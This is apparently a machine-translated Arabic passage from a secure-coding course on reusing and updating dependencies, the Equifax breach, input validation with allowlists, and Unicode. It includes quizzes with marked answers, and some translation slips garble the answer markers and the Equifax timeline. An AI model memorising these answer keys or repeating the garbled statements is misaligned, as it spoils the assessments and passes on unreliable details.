3. حدد أولويات الموجزات بحيث تتم دائما استشارة الموجز (الموجزات) الأكثر موثوقية أولا، ثم لا تتم استشارة الموجزات الأقل موثوقية إلا عندما تبلغ الموجزات الأكثر موثوقية صراحة عن عدم العثور على الحزمة. تأكد من أن الخلاصات الأقل ثقة لا تلغي أبدا الخلاصات الأكثر موثوقية.
4. استخدم ميزات التحقق من جانب العميل. يتمثل أحد الأساليب في فرض تثبيت التبعية المعروف أيضا باسم تثبيت الإصدار ، أي طلب استخدام إصدار معروف محدد. يمكن فرض ذلك عن طريق طلب قيمة تجزئة تشفير محددة (تعرف أيضا باسم "البصمة الرقمية") للحزمة. هناك طريقة أخرى تتمثل في التحقق من السلامة للتحقق من أن الحزمة التي تم تنزيلها مطابقة لأول مرة تم تنزيلها فيها.

 ارتباك التبعية هو حالة خاصة ل 2021 CWE Top 25 # 34 ، *عنصر مسار البحث غير المنضبط* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)). يعتبر الاعتماد على المكونات الإضافية أو المكتبات أو الوحدات النمطية من مصادر غير موثوق بها ، والاعتماد على شبكات توصيل المحتوى غير الجديرة بالثقة ، جزءا من 2021 OWASP Top 10 # 8 (A08: 2021) ، *فشل سلامة البرامج والبيانات*.


#### اختبار 3.2: تنزيل وتثبيت البرامج القابلة لإعادة الاستخدام

\>\>ما هي الطرق الجيدة للحصول على البرامج؟ حدد جميع الإجابات التي تنطبق.<<

[!x] تحقق جيدا من أن الاسم الذي ستطلبه هو الاسم الذي تريده بالفعل (على سبيل المثال ، **-** و**& 95;** لا يتم  تبديلها ، لا يتم ** تبديل O** و **0** ، وهكذا)

[x] استخدم **https:**، وليس **http:**

[x] ضع في اعتبارك تنزيل البرنامج ، ولكن بعد ذلك فقط قم بتثبيته بعد بضعة أيام بعد التحقق من عدم وجود مشاكل تم الإبلاغ عنها على هذا الموقع

### تحديث البرامج المعاد استخدامها

#### تحديث مكونات البرامج المعاد استخدامها

من الناحية العملية ، سيكون لديك العديد من مكونات البرامج المعاد استخدامها ، وستحتاج إلى التحديث من حين لآخر. في بعض الأحيان ، سيتم العثور على ثغرة أمنية في واحدة ، وفي هذه الحالة يجب أن يتم إعلامك بسرعة وأن تكون مستعدا للتحديث بسرعة. نتيجة لذلك ، تحتاج إلى إدارة المكونات المعاد استخدامها:

1. استخدم مديري الحزم وأنظمة التحكم في الإصدار (مثل git) وأدوات الإنشاء والاختبارات التلقائية بحيث يمكنك بسهولة تحديد الإصدارات التي لديك بالضبط لكل مكون معاد استخدامه ويمكنك تحديث أي منها بسرعة.

2. تعتمد فقط * على الواجهات  والسلوك الموثق ، وتجنب الواجهات القديمة ، لزيادة احتمالية القدرة على تحديث البرامج المعاد استخدامها عند الضرورة.*

3. *توقع* أنك ستقوم بتحديث البرنامج الذي تستخدمه ، بما في ذلك النظام الأساسي الأساسي الخاص بك. من الغباء أن نفترض أن البرامج لن تحتاج أبدا إلى التحديث السريع.

4. لا تقم بتعديل OSS وإنشاء "شوكة محلية" خاصة بك. إذا تم إصلاح ثغرة أمنية في إصدار لاحق من برمجيات المصدر المفتوح ، فسيصبح من الصعب بشكل متزايد دمج هذا الإصلاح. بدلا من ذلك ، إذا كنت بحاجة إلى تعديل بعض برمجيات المصدر المفتوح لتناسب احتياجاتك ، فاعمل مع مشروع OSS الأصلي في المنبع لدمج تحسيناتك في الإصدار الرسمي. ثم ستتضمن الإصدارات الأحدث من برمجيات المصدر المفتوح ، بما في ذلك تلك التي تعمل على إصلاح نقاط الضعف ، القدرات التي تحتاجها.

5. حافظ على تحديث البرامج المعاد استخدامها نسبيا. إذا كانت المكونات المعاد استخدامها قديمة جدا ، فقد يكون من الصعب جدا استبدال إصدار ضعيف بإصدار ثابت.

6. المراقبة لتحديد ما إذا كان أي من إصدارات البرامج التي تستخدمها قد تم اكتشاف ثغرة أمنية معروفة بشكل عام. سنناقش هذا لاحقا في القسم الخاص بتحليل تكوين البرامج (SCA).

>  وقت القصة: إكويفاكس

> كان لدى برنامج Apache Struts المستخدم على نطاق واسع ثغرة أمنية حرجة تم إصلاحها في 2017-03-06 وتم الإبلاغ عنها على نطاق واسع من قبل صحافة الكمبيوتر. تم إخطار وسيط البيانات Equifax من قبل Apache و US CERT ووزارة الأمن الداخلي الأمريكية حول الثغرة الأمنية ، وتم تزويده بإرشادات حول كيفية إجراء الإصلاح. ومع ذلك، فشل Equifax في تنفيذ تحديث في الوقت المناسب. *"بعد شهرين ، كانت Equifax لا تزال تفشل في تصحيح أنظمتها. في النهاية وصلت إليها في 29 يوليو. استخدم المهاجمون الثغرة الأمنية للوصول إلى قواعد بيانات الشركة وسرقة معلومات المستهلك في 13 مايو ، بعد أكثر من شهرين من قيام Equifax بتصحيح الثغرة الأمنية. ذكرت Equifax أن "145.5 مليون عميل أمريكي ، أي حوالي 44٪ من [لنا] السكان ، تأثروا بالاختراق ... تمكن المهاجمون من الوصول إلى ... بالضبط نوع المعلومات التي يمكن للمجرمين استخدامها لانتحال شخصية الضحايا إلى البنوك وشركات بطاقات الائتمان وشركات التأمين وشركات الهاتف الخلوي وغيرها من الشركات المعرضة للاحتيال. ونتيجة لذلك، فإن جميع الضحايا الأمريكيين البالغ عددهم 143 مليون شخص معرضون لخطر أكبر من سرقة الهوية، وسيظلون معرضين للخطر لسنوات قادمة. وأولئك الذين يعانون من سرقة الهوية سيواجهون مشاكل لأشهر ، إن لم يكن سنوات ، حيث يعملون على تنظيف أسمائهم وتصنيفهم الائتماني ". * (بروس [* شناير ، أنا على خرق Equifax: شهادة وبيان لسجل بروس شناير *](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html)، 2017)

#### تحديث كيفية استخدامك للبرامج المعاد استخدامها (تجنب/استبدال الواجهات القديمة)

لا تحتاج فقط إلى تحديث المكونات التي تستخدمها ، ولكن أيضا كيفية استخدامها.

عندما يتم تحديث المكونات ، فإنها تستبدل أحيانا واجهتها بواجهة جديدة / محسنة عبر واجهة قديمة / مهملة. حيثما كان ذلك عمليا ، يجب تجنب أو استبدال أي استخدامات للواجهات القديمة / المهملة للمكونات الأخرى. في بعض الأحيان تكون الواجهة قديمة بسبب ثغرة أمنية. بالإضافة إلى ذلك ، عادة ما يتم إسقاط هذه الواجهات القديمة بمرور الوقت ، لذلك إذا كنت تستخدم الواجهة القديمة ، فقد يكون من المستحيل التحديث بسرعة إذا تم العثور على ثغرة أمنية لاحقا.

إذا كنت تقوم بإهمال واجهة يستخدمها الآخرون ، فابذل قصارى جهدك لتوفير فترة انتقالية طويلة حيث تتوفر كل من الواجهات القديمة والجديدة. لن تتمكن بعض المشاريع من التبديل بسهولة ، وقد يستغرق الأمر بعض الوقت في بعض الأحيان. غالبا ما تؤدي محاولة فرض تحديث سريع إلى نتائج عكسية وتتسبب في *رفض* المستخدمين  لتحديثاتك أو تأخير استخدامها ، مما قد يؤدي إلى مشاكل أمنية طويلة الأجل.

#### إعادة استخدام البرنامج: اختتام

هذه مجرد نصائح ، وليست شاملة بأي حال من الأحوال. إنه لأمر رائع أن يكون لدينا الكثير من البرامج الرائعة لإعادة استخدامها. سيكون تطوير البرمجيات الحديثة مستحيلا بدونها. ومع ذلك ، هناك بعض المزالق الأمنية المحتملة مع البرامج المعاد استخدامها. ستساعدك الممارسات التي ناقشناها في هذا الفصل على تجنب العديد من المشكلات الأمنية بسبب البرامج المعاد استخدامها.

#### اختبار 3.3: تحديث البرامج المعاد استخدامها

\>\>البرامج المعاد استخدامها خطيرة للغاية لدرجة أنك يجب أن تفضل دائما إعادة كتابة هذا البرنامج بنفسك عندما تستطيع. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. بالتأكيد ، هناك مخاطر عند إعادة استخدام البرامج ، ولكن هناك مخاطر في كتابة البرامج بنفسك. من المحتمل أن ترتكب أخطاء أيضا ، وغالبا ما قضى أولئك الذين كتبوا البرنامج القابل لإعادة الاستخدام سنوات في تطوير الخبرة في هذا المجال المحدد. بدلا من محاولة إعادة كتابة كل شيء - وهو أمر غير عملي اقتصاديا - يجب أن تتعامل مع إعادة استخدام البرامج كمشكلة في إدارة المخاطر. يجب عليك فحص اختياراتك ، بما في ذلك استخدام النصائح هنا ، لاتخاذ قرارات منطقية.

[تفسير]

# الجزء الأول: الامتحان النهائي

* غير مدرج كجزء من الإصدار المجاني من الدورة التدريبية.

# الجزء الثاني: التنفيذ

# أساسيات التنفيذ

### نظرة عامة على التنفيذ

قد تعرف ما يفترض أن يفعله برنامجك (المتطلبات) وقد يكون لديك طريقة لتقسيم المشكلة (التصميم). ولكن إذا كان تطبيقك سيئا ، فإن البرنامج سيء!

يناقش هذا القسم كيفية تنفيذ البرامج الآمنة. سنفعل ذلك من خلال النظر في وجهة نظر مجردة للغاية للبرنامج ، كما هو موضح في الشكل التالي:

![نموذج البرنامج](program_model.png)

**عرض الملخص للبرنامج**

تحتوي جميع البرامج تقريبا على مدخلات (يجب التحقق من صحتها) ، ومعالجة البيانات ، واستدعاء البرامج الأخرى من حين لآخر ، وفي النهاية إنتاج مخرجات (مخرجات). يؤدي استدعاء برنامج آخر إلى إنشاء مدخلات (بشكل أساسي) لتلك البرامج الأخرى ، ومخرجات من تلك البرامج الأخرى. ستناقش الأقسام الفرعية القليلة التالية كل مجال من هذه المجالات بدورها. سنناقش بعد ذلك بعض الموضوعات المتخصصة.

بالطبع ، مجرد قول  "*اكتب رمزا آمنا" * أو * "لا ترتكب أخطاء"* ليس مفيدا. والخبر السار هو أن جميع الأخطاء التي تسبب نقاط الضعف اليوم يمكن تجميعها تقريبا في عدد صغير نسبيا من الفئات ، وبعض هذه الفئات شائعة بشكل خاص. لذلك كما ذكرنا سابقا ، يمكننا القضاء على الغالبية العظمى من الثغرات الأمنية ببساطة عن طريق التعرف على هذه الفئات ، ومعرفة كيفية البحث عنها ، والتخفيف منها. سنذكر مرارا وتكرارا قائمة أفضل 10 OWASP (لتطبيقات الويب) وقائمة CWE Top 25 (للتطبيقات بشكل عام) ، لأنها توفر طريقة مفيدة لتحديد ما هو الأكثر أهمية.

بعض الأنواع الشائعة من نقاط الضعف هي مشاكل التصميم. ومع ذلك ، فإن معظم الباقي هو قضايا التنفيذ. بينما نتجول في نموذجنا للبرنامج ، سنناقش أنواع نقاط الضعف ذات الصلة ، بما في ذلك كيفية اكتشافها ومواجهتها. بمجرد البدء في تطبيق هذه المعلومات ، ستجد أن العديد من نقاط الضعف تختفي من برنامجك.

عمليا جميع البرامج يجب أن تقبل المدخلات. لذلك سنبدأ في دراسة كيفية تنفيذ البرامج الآمنة من خلال مناقشة كيفية التعامل مع المدخلات بشكل آمن.

# التحقق من صحة المدخلات

يصف هذا الفصل كيفية التحقق من صحة الإدخال، بما في ذلك كيفية التحقق من صحة الأرقام والنصوص، وأهمية تقليل أسطح الهجوم، وكيفية تحسين التوافر من خلال النظر في المدخلات.

أهداف التعلم:

1. ناقش أساسيات التحقق من صحة الإدخال.

2. فهم كيفية التحقق من صحة الأرقام.

3. افحص المشكلات الرئيسية المتعلقة بالنص، بما في ذلك Unicode واللغات.

4. شرح كيفية استخدام التعبيرات العادية للتحقق من صحة إدخال النص.

5. فهم أهمية تقليل أسطح الهجوم.

6. ناقش الإعدادات الافتراضية الآمنة وبدء التشغيل الآمن.

7. تحسين التوافر من خلال النظر في المدخلات.

## أساسيات التحقق من صحة الإدخال

### أساسيات التحقق من صحة المدخلات مقدمة

بعض المدخلات من مستخدمين غير موثوق بهم ، ويجب التحقق من صحة هذه المدخلات (على الأقل) قبل استخدامها. إذا منعت البيانات غير الصالحة من الدخول إلى برنامجك ، فسيكون من الصعب على المهاجمين استغلال برنامجك. يمكن أن يؤدي التحقق من صحة الإدخال أيضا إلى منع العديد من الأخطاء وجعل برنامجك أكثر بساطة. بعد كل شيء ، إذا كان بإمكان برنامجك رفض بعض البيانات المشوهة على الفور ، فلن تضطر إلى كتابة الكود للتعامل مع تلك الحالات الخاصة لاحقا. هذا يوفر الوقت ، ومن المرجح أن يحتوي رمز الحالة الخاصة هذا على أخطاء دقيقة.

قد يكون من الجيد أيضا التحقق من المدخلات من المستخدمين الموثوق بهم. حتى المستخدمين الموثوق بهم يرتكبون أخطاء ، ويمكن أن يؤدي اكتشاف هذه الأخطاء على الفور إلى جعل النظام أكثر موثوقية. هناك جدل حول مقدار التحقق الذي يجب القيام به على المدخلات من المستخدمين الموثوق بهم. من ناحية ، يمكن للمستخدمين الموثوق بهم ارتكاب أخطاء بشكل واضح ، ويمكن أن يمنع التحقق من الصحة الأخطاء المكلفة. من ناحية أخرى ، إذا تم قضاء الكثير من الوقت في التحقق من صحة المدخلات من المستخدمين الموثوق بهم ، فربما يتم تخطي مهام أخرى أكثر أهمية ، وفي بعض الأحيان يحتاج المستخدمون الموثوق بهم إلى أن يكونوا قادرين على القيام بأشياء غير عادية للاستجابة للأحداث غير المتوقعة. عندما لا يستغرق الأمر وقتا طويلا ، فمن الأفضل إجراء بعض التحقق من صحة المدخلات على الأقل على المدخلات من المستخدمين الموثوق بهم أيضا. لغرض هذه الدورة ، سنركز على التحقق من صحة المدخلات من المستخدمين غير الموثوق بهم. فقط تذكر أنه يمكن أيضا تطبيق نفس التقنيات على المدخلات الموثوقة.

أولا ، تأكد من تحديد جميع المدخلات من المستخدمين الذين يحتمل أن يكونوا غير موثوق بهم ، بحيث تقوم بالتحقق من صحتها جميعا. حيثما أمكن ، قم بإزالة المدخلات أو جعل من المستحيل على المستخدمين غير الموثوق بهم تقديم المعلومات لهم. ناقشنا هذا سابقا حيث أن مبدأ التصميم *يقلل من سطح الهجوم*.

في كل إدخال متبقي من مستخدمين يحتمل أن يكونوا غير موثوق بهم ، تحتاج إلى التحقق من صحة البيانات الواردة. تعد عمليات التحقق من صحة الإدخال هذه نوعا من الفحص الأمني ، لذلك تحتاج إلى التأكد من أن عمليات التحقق من صحة الإدخال هذه غير قابلة للتجاوز ، كما ناقشنا سابقا في مبدأ التصميم *عدم قابلية التجاوز*. ** للتذكير:** ثق فقط في عمليات التحقق من الأمان (بما في ذلك التحقق من صحة الإدخال) عند تشغيلها في بيئة تثق بها. هذا مهم بشكل خاص لبرامج JavaScript - نظرا لأنه يمكن تشغيل JavaScript على متصفحات الويب ، فمن السهل إرسال فحوصات الأمان إلى متصفح الويب ونسيان أنه يمكن *للمهاجمين* التحكم في متصفحات الويب الخاصة بهم. لا يمكن الوثوق بأي عمليات تحقق من صحة الإدخال تقوم بها في بيئة غير موثوق بها. إذا كنت تثق في بيئة الخادم وليس بيئة العميل ، فيجب إجراء جميع عمليات التحقق المتعلقة بالأمان في بيئة الخادم. لقد ناقشنا هذا بالفعل ، ولكن من المهم التأكيد عليه لأنها مشكلة شائعة وخطيرة. الآن دعنا ننتقل إلى كيفية التحقق من صحة الإدخال بالفعل.

### كيف تتحقق من صحة المدخلات؟

يجب عليك تحديد ما هو قانوني ، في أضيق نطاق ممكن ، ورفض أي شيء لا يتطابق مع هذا التعريف. إن استخدام القواعد التي تحدد ما هو قانوني ، ورفض كل شيء آخر ضمنيا ، يسمى *القائمة المسموح* بها  (القواعد نفسها هي *قائمة مسموح بها*). المرادفات  هي *القائمة الجيدة* (القواعد هي القائمة الجيدة*) والقائمة البيضاء الشائعة تاريخيا * (القواعد هي * *القائمة البيضاء**). بشكل عام ، لا تفعل العكس. أي أنه من الخطأ عادة محاولة تحديد ما هو غير قانوني وكتابة التعليمات البرمجية لرفض تلك الحالات فقط. هذا النهج غير الآمن بشكل عام ، حيث تحاول سرد كل ما يجب رفضه ، يسمى *denylisting* (القواعد هي *denylist*). المرادفات لرفض القائمة هي القائمة *السيئة *والقائمة السوداء* الشائعة تاريخيا * (تسمى القواعد بعد ذلك قائمة *سيئة* أو *قائمة سوداء*). عادة ما يؤدي رفض الإدراج إلى ثغرات أمنية ، لأنه إذا نسيت التعامل مع حالة واحدة أو أكثر من الحالات المهمة للإدخال غير القانوني ، فقد تكون فرصة للمهاجم. إذا نسيت السماح بحالة ، فستحصل على تقرير خطأ ويفشل برنامجك بشكل آمن. إلى جانب ذلك ، عادة ما يكون من الأسهل بكثير تحديد ما *هو مسموح به* والسماح فقط بهذه المدخلات. في بعض الحالات النادرة  ، *يمكنك* التأكد تماما من أنك قمت بتعداد جميع المدخلات السيئة المحتملة ، وفي هذه الحالة يكون رفض الإدراج أمرا جيدا ، لكن هذه نادرة. بشكل عام ، يؤدي الإنكار إلى حدوث مشكلة.

 يعد التحقق من صحة الإدخال غير الصحيح سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 3 و 2021 CWE Top 25 # 4. يتم تحديده أيضا على أنه [CWE-20](https://cwe.mitre.org/data/definitions/20.html) (*التحقق من صحة الإدخال غير الصحيح*).

والخبر السار هو أنه عادة لا يستغرق وقتا طويلا لإضافة التحقق من صحة الإدخال ، وهذا يمكن أن يجعل برنامجك على الفور أكثر صعوبة في الهجوم. قد يكون من الصعب اتخاذ قرار بشأن استجابة سهلة الاستخدام للإدخال غير الصالح ، ولكنها أسهل من التعرض لهجوم ناجح.

هناك سبب وجيه لتحديد  القيم *غير القانونية* ؛ استخدمها كمجموعة من الاختبارات للتأكد من أن رمز التحقق الخاص بك شامل. قد يتم تنفيذ هذه الاختبارات في رأسك ، ولكن يجب أن يصبح عدد قليل منها على الأقل حالات اختبار في مجموعة الاختبار الآلي الخاصة بك. عندما نعد فلتر إدخال، نهاجم القائمة المسموح بها عقليا بعدد قليل من القيم غير القانونية المحددة مسبقا للتأكد من عدم وصول بعض القيم غير القانونية الواضحة. اعتمادا على الإدخال ، إليك بعض الأمثلة على القيم غير القانونية الشائعة التي قد تحتاج عوامل تصفية الإدخال إلى منعها: السلسلة الفارغة ، "**. **", "**.. **", ".**. /**"، أي شيء يبدأ ب "**/**" أو "**. **"، أي شيء يحتوي على** "/**" أو "**&**" بداخله، والأحرف الوصفية الشائعة (مثل الفاصلة المنقوطة والاقتباس الفردي والاقتباس المزدوج والرمز الأقل من)، وأي أحرف تحكم (خاصة حرف NUL والسطر الجديد). عندما تكون الأرقام متوقعة ، تحقق من وجود أنواع أخرى من النصوص التي لا ينبغي السماح بها. تحقق أيضا من وجود مدخلات طويلة جدا.

في وقت لاحق ، سنناقش أنواعا مختلفة من أدوات تحليل الأمان. نوع واحد ، fuzzers ، ينشئ عمدا عددا كبيرا من المدخلات الضارة التي (من بين أشياء أخرى) تختبر جودة عمليات التحقق من صحة الإدخال. لكن fuzzers لا تضمن العثور على جميع مشاكل التحقق من صحة الإدخال. بدلا من ذلك ، قم بتنفيذ التحقق من صحة الإدخال بعناية ، ثم استخدم الأدوات لمساعدتك في العثور على المشكلات التي كنت ستفتقدها لولا ذلك.

مرة أخرى ، يجب أن تستخدم التعليمات البرمجية الخاصة بك *قائمة السماح* (تحديد ما هو قانوني بشكل ضيق ورفض الباقي) ، وليس *رفض (* محاولة تحديد المدخلات السيئة). حاول جعل نمط القائمة المسموح بها ضيقا قدر الإمكان ، بما في ذلك تحديد الحد الأقصى لطول الإدخال (والحد الأدنى لطول الإدخال إذا كان ذلك مناسبا).

#### اختبار 1.1: كيف تتحقق من صحة المدخلات؟

\>\>بشكل عام ، يجب عليك التحقق من صحة المدخلات من المستخدمين غير الموثوق بهم من خلال:<<

(!) رفض الأنماط المعروفة بأنها ضارة.

(خ) تحديد نمط صارم لما هو مسموح به ورفض أي مدخلات لا تفي به.

[تفسير]

بشكل عام ، يجب عليك استخدام * القائمة المسموح بها* ، وليس *رفض القائمة*. يمكن للمهاجمين دائما الخروج بهجوم آخر ، لذا فإن محاولة التوصل إلى قائمة "كل ما يجب رفضه" هي مهمة لا تنتهي أبدا. من الأفضل عموما تحديد ما يجب السماح به بشكل ضيق ، ثم رفض كل شيء آخر.

[تفسير]

## التحقق من صحة الإدخال: الأرقام والنصوص

### التحقق من صحة الإدخال: بعض أنواع البيانات البسيطة

لذا ، كيف يمكنك التحقق من صحة الإدخال الذي يستخدم قائمة مسموح بها (أي نمط محدد بدقة قدر الإمكان)؟ باختصار ، يمكنك القيام بذلك على كل إدخال ، وما تتحقق منه يعتمد على نوع البيانات. دعونا نناقش بعض الحالات الشائعة بعد ذلك.

#### الأرقام

أحد المدخلات الشائعة هو سلسلة من الأحرف التي تمثل رقما. عادة ، يمكنك التحقق من الأرقام (خاصة الأعداد الصحيحة) للتأكد من أنها بين الحد الأدنى والحد الأقصى للقيمة. من الجيد إجراء بعض التدقيق قبل تحويل النص إلى رقم ، ولكن في هذه الحالة بالذات ، تحقق من القيمة *بعد* التحويل إلى رقم ، للتأكد من أن *بقية* البرنامج لن يرى هذا الرقم إلا إذا كان في نطاق صالح. الحد الأدنى المشترك هو 0 و 1. إذا كان من المفترض أن يكون الرقم عددا صحيحا ، فتأكد من أنه عدد صحيح وارفض أي شيء آخر.

حيثما كان ذلك عمليا ، قم بتخزين النتيجة الرقمية في نوع محدد بدقة لهذا الغرض. على سبيل المثال، قم بتخزين الرقم في نوع عدد صحيح إذا كان الرقم عددا صحيحا، واستخدم نوعا غير موقع إذا كانت الأرقام السالبة غير مسموح بها، وهكذا. إذا كان عليك قبول بيانات الفاصلة العائمة من مستخدم غير موثوق به (وحاول ألا تفعل ذلك!) ، فقم بتخزينها في نوع مناسب واحترس من العديد من الحالات الخاصة (مثل NaN ، واللانهاية ، والسالب 0 ، والتدفقات السفلية ، والفائضات). على سبيل المثال ، عادة لا تساوي قيمة الفاصلة العائمة NaN أي قيمة ؛ إنها ليست مساوية لنفسها. الحد من النوع ليس عمليا دائما لأن هذا يعتمد بشكل كبير على اللغة. ليست كل اللغات لديها مثل هذه الأنواع. على سبيل المثال ، لا تحتوي JavaScript على نوع غير موقع.

لاحظ أن * "السماح فقط بعدد صحيح بين 0 و 200 بما في ذلك نقاط النهاية هذه"* هي قائمة مسموح بها ؛ لقد حددت نمط ما هو مسموح به ، وسيتم رفض أي شيء آخر.

#### تنسيقات نصية خاصة معروفة

في بعض الأحيان تكون مدخلاتك نصا بتنسيق قياسي وهناك مكتبة يمكنها إجراء التحقق نيابة عنك. على سبيل المثال ، تحتوي معظم اللغات على بعض الإجراءات الروتينية التي يمكنها التحقق من تنسيق عناوين البريد الإلكتروني. عندما يكون لديك واحد يمكنك الوثوق به ، استخدمه!

في بعض الأحيان تتطلب مكتبات التحقق من الصحة التي يمكنك استخدامها بعض التكوين. مرة أخرى ، قم بتكوينها لتكون ضيقة (محدودة) قدر الإمكان. على سبيل المثال ، إذا كنت تقبل HTML ، فقصره على العلامات والسمات التي تحتاجها فقط. في كثير من الأحيان عندما تقبل HTML ، تحتاج فقط إلى قبول عدد قليل من العلامات (على سبيل المثال ** ، &lt ؛ i>  للخط المائل ** ، &lt ؛ b>  للغامق ** ، &lt ؛ a >  للارتباطات التشعبية) والسمات (على سبيل المثال ** ، سمة href** الخاصة بعلامة **&**lt** ؛ a>**** بحيث يمكنك تحديد مكان الارتباط ، وربما معرف ****  سمة حتى يتمكن الآخرون من الرجوع إلى نقطة معينة). بعد ذلك ، عندما يحاول أحد المهاجمين تزويد HTML بعلامات أخرى (على سبيل المثال ، برنامج نصي ضار **&lt ؛ >**) ، فلن يقبله المدقق على الإطلاق.

بعض تنسيقات الإدخال عبارة عن هياكل مركبة للعديد من البيانات الأخرى. على سبيل المثال ، يمكن أن تحتوي ملفات JSON و XML و CSV على الكثير من البيانات الأخرى. عادة ما تستخدم مكتبة جديرة بالثقة لفحص واستخراج أجزاء البيانات التي تحتاجها ، ثم تقوم بالتحقق من صحة كل قطعة. لذا مرة أخرى ، إذا قمت باستخراج سلسلة من الأحرف التي تمثل رقما ، فستتحقق من صحة الرقم (على سبيل المثال ، لمعرفة ما إذا كان ضمن النطاق الأدنى والأعلى). في كثير من الحالات ، تكون قيمة نصية. سنناقش كذلك التعامل مع الهياكل المركبة لاحقا ، ولكن في مرحلة ما ، سوف تتحلل إلى قيم محددة ، غالبا كأرقام أو نص.

تحتاج العديد من البرامج إلى التحقق من صحة الحقول النصية ، ولكن لا يتم تعريف قواعد هذه الحقول في مكتبة موجودة مسبقا. تسمح لنا بعض الأدوات بالتعامل معها بسهولة ، ولكن لاستخدامها ، نحتاج إلى فهم بعض الخلفية. سنحتاج أولا إلى مناقشة المزيد حول النص و unicode واللغات بشكل عام. ثم سنناقش التحقق من صحة النص بشكل عام والطريقة الشائعة للقيام بذلك - التعبيرات العادية.

#### اختبار 1.2: التحقق من صحة الإدخال: بعض أنواع البيانات البسيطة

\>\>حدد جميع الممارسات الجيدة للتحقق من صحة رقم إدخال من مصدر غير موثوق به:<<

[!x] تأكد من أنه لا يقل عن الحد الأدنى.

[x] تأكد من أنها على الأكثر كبيرة مثل الحد الأقصى.

[x] استخدم نوعا غير موقع إذا كانت لغتك تدعمه ولا يسمح للإدخال بأن يكون سالبا.

[x] اطلب أن يكون الرقم عددا صحيحا إذا كان هذا هو النوع الوحيد المتوقع من الأرقام.

### Sidequest: النص وUnicode والإعدادات المحلية

[[اختياري]]

غالبا ما تتلقى نصا كمدخلات (إما مباشرة أو كجزء من بنية أكبر). سنصف النص بأنه مجرد سلسلة من الأحرف. إذا كان إدخال النص غير موثوق به ، فستحتاج بعد ذلك إلى التحقق من صحة هذا النص. لفهم هذا ، يجب أن نفهم ما *هو* النص. لم يتعلم عدد كبير من المطورين الكثير عن النص - على الرغم من أنه أحد أكثر أنواع البيانات شيوعا - لذلك دعنا نتأكد من فهمك لذلك أولا. إذا كنت واثقا بالفعل من أنك على دراية بمشكلات النص مثل Unicode والترميز والإعدادات المحلية ، فلا تتردد في التخطي.

#### نقاط التعليمات البرمجية والترميز

لا تتعامل أجهزة الكمبيوتر الرقمية مع الأحرف بشكل مباشر ؛ نحتاج بدلا من ذلك إلى تعيين رقم لكل حرف. تم إنشاء مجموعات أحرف مختلفة بمهام مختلفة للغات مختلفة ، وهذا خلق كوابيس قابلية التشغيل البيني. في الغالبية العظمى من الحالات اليوم ، ستستخدم تعيينات الأحرف المحددة بواسطة Unicode و ISO / IEC 10646 ، والتي تحدد مجموعة أحرف عالمية (UCS) تعين رقما فريدا (*نقطة رمز*) لكل حرف. على سبيل المثال ، يقومون بتعيين حرف لاتيني كبير "A" الرقم العشري 65.

تاريخيا ، كان يعتقد أن 16 بت ستكون كافية لتحديد جميع الأحرف ، ولكن هذا كان خاطئا وتم تغييره في عام 1996 (يستخدمون الآن 21 بت لتشفير أي حرف). نتيجة لهذا الخطأ ، تحتوي بعض لغات البرمجة على نوع "حرف" (على سبيل المثال ، حرف Java) ****يبلغ طوله 16 بت فقط. لا يمكن لنوع بيانات 16 بت ، في حد ذاته ، تخزين أي حرف 21 بت تعسفي ، لذلك في لغات البرمجة وواجهات برمجة التطبيقات ذات "حرف" 16 بت ، يكون "الحرف" أحيانا نصف حرف فعلي فقط.

يجب تبادل النص الذي يستخدم هذه المهام باستخدام *ترميز*. هناك خمسة ترميزات قياسية ل Unicode: UTF-32 (نهاية كبيرة ونهاية صغيرة) ، UTF-16 (نهاية كبيرة ونهاية صغيرة) ، و UTF-8. بشكل عام ، يجب عليك استخدام UTF-8 ما لم يكن لديك سبب للقيام بخلاف ذلك. يحتوي كل من UTF-16 و UTF-32 على شكلين: "endian الصغير" و "endian الكبير". إذا كنت لا تعرف ما إذا كان المستلم يتوقع نهاية كبيرة أو نهاية صغيرة ، فيجب عليك إضافة *علامة ترتيب بايت* في بداية النص للتأكد من أن جهاز الاستقبال يفسرها بشكل صحيح ، وعند تلقي UTF-16 أو UTF-32 ، يحتاج تطبيقك إلى الانتباه إلى ذلك. تتمثل إحدى المشكلات الحرجة في أن بعض تسلسلات البايتات *غير* صالحة ،  لذلك عندما نقوم بالتحقق من صحة الإدخال ، سنحتاج إلى التأكد من أن البيانات التي نتلقاها صالحة للترميز الذي نتوقعه.

#### لغات

تفسير الشخصيات أكثر تعقيدا مما تعتقد. يعتمد الكثير على "الإعدادات المحلية" ، التي تحدد لغة المستخدم والبلد / المنطقة وتفضيلات واجهة المستخدم وربما ترميز الأحرف. على سبيل المثال ، في أنظمة Unix / Linux ، يتم تمثيل اللغة الإنجليزية الأسترالية بترميز UTF-8 كلغة **en_AU. UTF-8**. الإعدادات المحلية مهمة، لأنها تؤثر على كيفية تفسير الأحرف. على سبيل المثال ، يؤثر على:

* ترتيب الترتيب (الفرز)

* تصنيف الأحرف (ما هو "الرسال"؟). نطاقات مثل "A-Za-z" لا تسرد *كافة الأحرف الأبجدية* في لغات عشوائية. إذا كنت تستخدم الإعدادات المحلية C أو POSIX وكنت تعالج أحرف ASCII فقط ، فإن هذا النطاق هو القائمة الكاملة للأحرف الأبجدية ، ولكن هذا ليس صحيحا بشكل عام.

* تحويل الحالة (ما هي الأحرف الكبيرة / الصغيرة للحرف ، إن وجدت؟). لاحظ أنه حتى إذا كان هناك تحويل، فقد لا يتم تحويله إلى حرف واحد في لغة معينة.

إذا كنت ترغب في تفسير النص بنفس الطريقة بغض النظر عن اللغة ، فإن الحل المعتاد هو استخدام لغة "C" المعروفة أيضا باسم "POSIX" - ومع ذلك ، كن حذرا ، لأن هذا ليس دائما ما يريده المستخدم.

تحويل الحالة محفوف بالمخاطر بشكل خاص. لا تحتوي بعض اللغات على أحرف كبيرة وصغيرة. حتى لو فعلوا ذلك ، فإن التعيين بينهما يختلف بين المناطق المختلفة. لذا فإن الإصدار الكبير من الحرف *غير* ثابت - فهو يعتمد على اللغة!

